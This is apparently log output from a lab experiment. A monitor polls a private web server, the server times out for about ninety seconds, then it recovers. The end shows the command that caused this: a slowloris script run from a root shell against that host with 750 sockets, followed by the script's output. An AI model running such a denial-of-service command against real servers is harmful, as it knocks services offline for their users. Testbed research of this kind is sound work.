[✓] 26-06-2025 15:06:12 | HTTP Status: 200	RTT: 251.72 ms
[✓] 26-06-2025 15:06:13 | HTTP Status: 200	RTT: 249.69 ms
[✓] 26-06-2025 15:06:13 | HTTP Status: 200	RTT: 223.23 ms
[✓] 26-06-2025 15:06:14 | HTTP Status: 200	RTT: 210.61 ms
[✓] 26-06-2025 15:06:15 | HTTP Status: 200	RTT: 257.58 ms
[✓] 26-06-2025 15:06:16 | HTTP Status: 200	RTT: 213.65 ms
[✓] 26-06-2025 15:06:16 | HTTP Status: 200	RTT: 275.91 ms
[✓] 26-06-2025 15:06:17 | HTTP Status: 200	RTT: 258.10 ms
[✓] 26-06-2025 15:06:18 | HTTP Status: 200	RTT: 254.39 ms
[✓] 26-06-2025 15:06:19 | HTTP Status: 200	RTT: 252.78 ms
[✓] 26-06-2025 15:06:19 | HTTP Status: 200	RTT: 248.51 ms
[✓] 26-06-2025 15:06:20 | HTTP Status: 200	RTT: 245.07 ms
[✓] 26-06-2025 15:06:21 | HTTP Status: 200	RTT: 238.45 ms
[✓] 26-06-2025 15:06:21 | HTTP Status: 200	RTT: 231.85 ms
[✓] 26-06-2025 15:06:22 | HTTP Status: 200	RTT: 226.09 ms
[✓] 26-06-2025 15:06:23 | HTTP Status: 200	RTT: 242.53 ms
[✓] 26-06-2025 15:06:24 | HTTP Status: 200	RTT: 220.11 ms
[✓] 26-06-2025 15:06:24 | HTTP Status: 200	RTT: 234.40 ms
[✓] 26-06-2025 15:06:25 | HTTP Status: 200	RTT: 291.61 ms
[✓] 26-06-2025 15:06:26 | HTTP Status: 200	RTT: 224.40 ms
[✓] 26-06-2025 15:06:27 | HTTP Status: 200	RTT: 256.64 ms
[✓] 26-06-2025 15:06:27 | HTTP Status: 200	RTT: 219.49 ms
[✓] 26-06-2025 15:06:28 | HTTP Status: 200	RTT: 244.97 ms
[✓] 26-06-2025 15:06:29 | HTTP Status: 200	RTT: 244.45 ms
[✓] 26-06-2025 15:06:30 | HTTP Status: 200	RTT: 261.22 ms
[✓] 26-06-2025 15:06:30 | HTTP Status: 200	RTT: 250.16 ms
[✓] 26-06-2025 15:06:31 | HTTP Status: 200	RTT: 249.11 ms
[✓] 26-06-2025 15:06:32 | HTTP Status: 200	RTT: 218.22 ms
[✓] 26-06-2025 15:06:33 | HTTP Status: 200	RTT: 203.67 ms
[✓] 26-06-2025 15:06:33 | HTTP Status: 200	RTT: 205.31 ms
[✓] 26-06-2025 15:06:34 | HTTP Status: 200	RTT: 244.26 ms
[✓] 26-06-2025 15:06:35 | HTTP Status: 200	RTT: 248.60 ms
[✓] 26-06-2025 15:06:36 | HTTP Status: 200	RTT: 213.61 ms
[✓] 26-06-2025 15:06:36 | HTTP Status: 200	RTT: 203.66 ms
[✓] 26-06-2025 15:06:37 | HTTP Status: 200	RTT: 206.01 ms
[✓] 26-06-2025 15:06:38 | HTTP Status: 200	RTT: 258.74 ms
[✓] 26-06-2025 15:06:38 | HTTP Status: 200	RTT: 277.91 ms
[✓] 26-06-2025 15:06:39 | HTTP Status: 200	RTT: 270.49 ms
[✓] 26-06-2025 15:06:40 | HTTP Status: 200	RTT: 238.15 ms
[✓] 26-06-2025 15:06:41 | HTTP Status: 200	RTT: 264.96 ms
[✓] 26-06-2025 15:06:41 | HTTP Status: 200	RTT: 206.43 ms
[✓] 26-06-2025 15:06:42 | HTTP Status: 200	RTT: 252.08 ms
[✓] 26-06-2025 15:06:43 | HTTP Status: 200	RTT: 248.50 ms
[✓] 26-06-2025 15:06:44 | HTTP Status: 200	RTT: 242.90 ms
[✓] 26-06-2025 15:06:44 | HTTP Status: 200	RTT: 219.48 ms
[✓] 26-06-2025 15:06:45 | HTTP Status: 200	RTT: 234.26 ms
[✓] 26-06-2025 15:06:46 | HTTP Status: 200	RTT: 236.65 ms
[✓] 26-06-2025 15:06:47 | HTTP Status: 200	RTT: 240.72 ms
[✓] 26-06-2025 15:06:47 | HTTP Status: 200	RTT: 217.81 ms
[✓] 26-06-2025 15:06:48 | HTTP Status: 200	RTT: 261.57 ms
[✓] 26-06-2025 15:06:49 | HTTP Status: 200	RTT: 236.58 ms
[✓] 26-06-2025 15:06:50 | HTTP Status: 200	RTT: 241.88 ms
[✓] 26-06-2025 15:06:50 | HTTP Status: 200	RTT: 237.73 ms
[✓] 26-06-2025 15:06:51 | HTTP Status: 200	RTT: 253.53 ms
[✓] 26-06-2025 15:06:52 | HTTP Status: 200	RTT: 237.89 ms
[✓] 26-06-2025 15:06:53 | HTTP Status: 200	RTT: 314.47 ms
[✓] 26-06-2025 15:06:53 | HTTP Status: 200	RTT: 249.49 ms
[✓] 26-06-2025 15:06:54 | HTTP Status: 200	RTT: 272.16 ms
[✓] 26-06-2025 15:06:55 | HTTP Status: 200	RTT: 275.79 ms
[✓] 26-06-2025 15:06:56 | HTTP Status: 200	RTT: 227.41 ms
[✓] 26-06-2025 15:06:56 | HTTP Status: 200	RTT: 255.27 ms
[✓] 26-06-2025 15:06:57 | HTTP Status: 200	RTT: 251.86 ms
[✓] 26-06-2025 15:06:58 | HTTP Status: 200	RTT: 254.65 ms
[✓] 26-06-2025 15:06:59 | HTTP Status: 200	RTT: 253.31 ms
[✓] 26-06-2025 15:06:59 | HTTP Status: 200	RTT: 238.85 ms
[✓] 26-06-2025 15:07:00 | HTTP Status: 200	RTT: 266.82 ms
[✓] 26-06-2025 15:07:01 | HTTP Status: 200	RTT: 225.72 ms
[✓] 26-06-2025 15:07:02 | HTTP Status: 200	RTT: 235.28 ms
[✓] 26-06-2025 15:07:02 | HTTP Status: 200	RTT: 240.48 ms
[✓] 26-06-2025 15:07:03 | HTTP Status: 200	RTT: 228.04 ms
[✓] 26-06-2025 15:07:04 | HTTP Status: 200	RTT: 263.10 ms
[✓] 26-06-2025 15:07:05 | HTTP Status: 200	RTT: 219.53 ms
[✓] 26-06-2025 15:07:05 | HTTP Status: 200	RTT: 254.86 ms
[✓] 26-06-2025 15:07:06 | HTTP Status: 200	RTT: 216.72 ms
[✓] 26-06-2025 15:07:07 | HTTP Status: 200	RTT: 251.05 ms
[✓] 26-06-2025 15:07:08 | HTTP Status: 200	RTT: 251.66 ms
[✓] 26-06-2025 15:07:08 | HTTP Status: 200	RTT: 245.71 ms
[✓] 26-06-2025 15:07:09 | HTTP Status: 200	RTT: 221.17 ms
[✓] 26-06-2025 15:07:10 | HTTP Status: 200	RTT: 163.00 ms
[✓] 26-06-2025 15:07:10 | HTTP Status: 200	RTT: 227.77 ms
[✓] 26-06-2025 15:07:11 | HTTP Status: 200	RTT: 245.57 ms
[✓] 26-06-2025 15:07:12 | HTTP Status: 200	RTT: 254.44 ms
[✓] 26-06-2025 15:07:13 | HTTP Status: 200	RTT: 252.98 ms
[✓] 26-06-2025 15:07:13 | HTTP Status: 200	RTT: 256.95 ms
[✓] 26-06-2025 15:07:14 | HTTP Status: 200	RTT: 234.40 ms
[✓] 26-06-2025 15:07:15 | HTTP Status: 200	RTT: 261.63 ms
[✓] 26-06-2025 15:07:16 | HTTP Status: 200	RTT: 208.32 ms
[✓] 26-06-2025 15:07:16 | HTTP Status: 200	RTT: 255.25 ms
[✓] 26-06-2025 15:07:17 | HTTP Status: 200	RTT: 228.75 ms
[✓] 26-06-2025 15:07:18 | HTTP Status: 200	RTT: 265.51 ms
[✓] 26-06-2025 15:07:19 | HTTP Status: 200	RTT: 242.72 ms
[✓] 26-06-2025 15:07:19 | HTTP Status: 200	RTT: 284.07 ms
[✓] 26-06-2025 15:07:20 | HTTP Status: 200	RTT: 308.18 ms
[✓] 26-06-2025 15:07:21 | HTTP Status: 200	RTT: 258.01 ms
[✓] 26-06-2025 15:07:22 | HTTP Status: 200	RTT: 229.19 ms
[✓] 26-06-2025 15:07:22 | HTTP Status: 200	RTT: 225.58 ms
[✓] 26-06-2025 15:07:23 | HTTP Status: 200	RTT: 220.10 ms
[✓] 26-06-2025 15:07:24 | HTTP Status: 200	RTT: 206.57 ms
[✓] 26-06-2025 15:07:25 | HTTP Status: 200	RTT: 203.23 ms
[✓] 26-06-2025 15:07:25 | HTTP Status: 200	RTT: 240.45 ms
[✓] 26-06-2025 15:07:26 | HTTP Status: 200	RTT: 231.28 ms
[✓] 26-06-2025 15:07:27 | HTTP Status: 200	RTT: 217.78 ms
[✓] 26-06-2025 15:07:28 | HTTP Status: 200	RTT: 229.68 ms
[✓] 26-06-2025 15:07:28 | HTTP Status: 200	RTT: 216.33 ms
[✓] 26-06-2025 15:07:29 | HTTP Status: 200	RTT: 247.14 ms
[✓] 26-06-2025 15:07:30 | HTTP Status: 200	RTT: 239.08 ms
[✓] 26-06-2025 15:07:30 | HTTP Status: 200	RTT: 236.82 ms
[✓] 26-06-2025 15:07:31 | HTTP Status: 200	RTT: 260.83 ms
[✓] 26-06-2025 15:07:32 | HTTP Status: 200	RTT: 276.96 ms
[✓] 26-06-2025 15:07:33 | HTTP Status: 200	RTT: 274.71 ms
[✓] 26-06-2025 15:07:34 | HTTP Status: 200	RTT: 63.41 ms
[✓] 26-06-2025 15:07:34 | HTTP Status: 200	RTT: 273.02 ms
[✓] 26-06-2025 15:07:35 | HTTP Status: 200	RTT: 245.16 ms
[✓] 26-06-2025 15:07:36 | HTTP Status: 200	RTT: 298.05 ms
[✓] 26-06-2025 15:07:36 | HTTP Status: 200	RTT: 302.06 ms
[✓] 26-06-2025 15:07:37 | HTTP Status: 200	RTT: 276.61 ms
[✓] 26-06-2025 15:07:38 | HTTP Status: 200	RTT: 298.66 ms
[✓] 26-06-2025 15:07:39 | HTTP Status: 200	RTT: 243.65 ms
[✓] 26-06-2025 15:07:40 | HTTP Status: 200	RTT: 247.55 ms
[✓] 26-06-2025 15:07:40 | HTTP Status: 200	RTT: 288.74 ms
[✗] 26-06-2025 15:07:41 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:07:47 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:07:52 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:07:58 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:03 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:09 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:15 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:20 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:26 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:31 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:37 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:42 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:48 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:08:54 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:09:00 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✗] 26-06-2025 15:09:05 | Request failed: HTTPConnectionPool(host='192.168.71.135', port=80): Read timed out. (read timeout=5)
[✓] 26-06-2025 15:09:11 | HTTP Status: 200	RTT: 2637.41 ms
[✓] 26-06-2025 15:09:14 | HTTP Status: 200	RTT: 273.69 ms
[✓] 26-06-2025 15:09:15 | HTTP Status: 200	RTT: 220.15 ms
[✓] 26-06-2025 15:09:16 | HTTP Status: 200	RTT: 245.44 ms
[✓] 26-06-2025 15:09:16 | HTTP Status: 200	RTT: 203.35 ms
[✓] 26-06-2025 15:09:17 | HTTP Status: 200	RTT: 227.40 ms
[✓] 26-06-2025 15:09:18 | HTTP Status: 200	RTT: 211.50 ms
[✓] 26-06-2025 15:09:19 | HTTP Status: 200	RTT: 272.20 ms
[✓] 26-06-2025 15:09:19 | HTTP Status: 200	RTT: 240.75 ms
[✓] 26-06-2025 15:09:20 | HTTP Status: 200	RTT: 231.35 ms
[✓] 26-06-2025 15:09:21 | HTTP Status: 200	RTT: 290.76 ms
[✓] 26-06-2025 15:09:22 | HTTP Status: 200	RTT: 269.85 ms
[✓] 26-06-2025 15:09:22 | HTTP Status: 200	RTT: 246.27 ms
[✓] 26-06-2025 15:09:23 | HTTP Status: 200	RTT: 271.58 ms
[✓] 26-06-2025 15:09:24 | HTTP Status: 200	RTT: 240.39 ms
[✓] 26-06-2025 15:09:25 | HTTP Status: 200	RTT: 221.02 ms
[✓] 26-06-2025 15:09:25 | HTTP Status: 200	RTT: 220.16 ms
[✓] 26-06-2025 15:09:26 | HTTP Status: 200	RTT: 250.64 ms
[✓] 26-06-2025 15:09:27 | HTTP Status: 200	RTT: 238.83 ms
[✓] 26-06-2025 15:09:28 | HTTP Status: 200	RTT: 259.09 ms
[✓] 26-06-2025 15:09:28 | HTTP Status: 200	RTT: 291.03 ms
[✓] 26-06-2025 15:09:29 | HTTP Status: 200	RTT: 231.47 ms
[✓] 26-06-2025 15:09:30 | HTTP Status: 200	RTT: 270.92 ms
[✓] 26-06-2025 15:09:31 | HTTP Status: 200	RTT: 234.64 ms
[✓] 26-06-2025 15:09:31 | HTTP Status: 200	RTT: 202.80 ms

==========================
root@fc9a360cc2aa:/opt/oai-nr-ue/etc/lowRateDoS# python3 slowloris.py 192.168.71.135 -S 10.0.0.2 -s 750
[26-06-2025 15:07:29] Attacking 192.168.71.135 with 750 sockets.
[26-06-2025 15:07:29] Creating sockets...
[26-06-2025 15:07:47] Sending keep-alive headers...
[26-06-2025 15:07:47] Socket count: 750
[26-06-2025 15:08:02] Sending keep-alive headers...
[26-06-2025 15:08:02] Socket count: 750
[26-06-2025 15:08:17] Sending keep-alive headers...
[26-06-2025 15:08:17] Socket count: 750
[26-06-2025 15:08:32] Sending keep-alive headers...
[26-06-2025 15:08:32] Socket count: 750
[26-06-2025 15:08:47] Sending keep-alive headers...
[26-06-2025 15:08:47] Socket count: 750
[26-06-2025 15:09:02] Sending keep-alive headers...
[26-06-2025 15:09:02] Socket count: 750